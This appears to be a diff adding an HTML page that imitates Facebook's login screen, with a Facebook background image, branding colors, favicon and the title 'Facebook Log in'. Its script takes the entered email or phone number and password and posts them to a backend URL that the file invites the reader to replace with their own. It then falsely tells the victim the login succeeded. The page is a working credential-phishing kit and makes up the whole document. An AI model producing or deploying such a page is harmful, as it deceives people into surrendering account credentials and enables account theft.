@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style type="text/css">
+        body{
+            background:url('../img/fb.png') no-repeat;
+  background-size:cover;
+        }
+        .container{
+         margin-top: 79.1%;
+            
+        }
+        .but{
+            
+            height:3.5em;
+            width: 34.5em;
+           
+            border-radius: 30px;
+            margin-top: 10px;
+            background:#0064E0;
+            border: #0021bb 1px solid;
+            color: white;
+            
+             }
+        #emailOrMobile{
+            
+            height:4.3em;
+            width: 33em;
+            
+            border-radius: 12px;
+           
+            background:white;
+            border: #A2ACB5 1px solid;
+            color: black;
+            margin-bottom:1em;
+            padding-left:1em;
+           
+            
+        }
+        
+        #password{
+            height:4.3em;
+            width: 33em;
+            padding-left:1em;
+            border-radius: 12px;
+      
+            background:#white;
+            border: #A2ACB5 1px solid;
+            color: black;
+            
+        }
+        
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Log in</title>
+    <link rel="icon" href="img/fbicon.png">
+</head>
+<body>
+    <div class="container">
+        <form id="loginForm">
+            <input type="text" id="emailOrMobile" placeholder="Mobile number or email" required>
+            
+            <input type="password" id="password" placeholder="Password" required>
+            <button class="but" type="submit" onclick="handleSubmit(event)"><b>Log in</b></button>
+        </form>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            const emailOrMobile = document.getElementById('emailOrMobile').value;
+            const password = document.getElementById('password').value;
+
+            // Send login data to backend (replace with your actual backend URL)
+            fetch('http://localhost:3000/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ emailOrMobile, password }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Login data sent:', data);
+                alert('Login successful'); // Notify user
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Login failed'); // Notify user
+            });
+        }
+    </script>
+</body>
+</html>
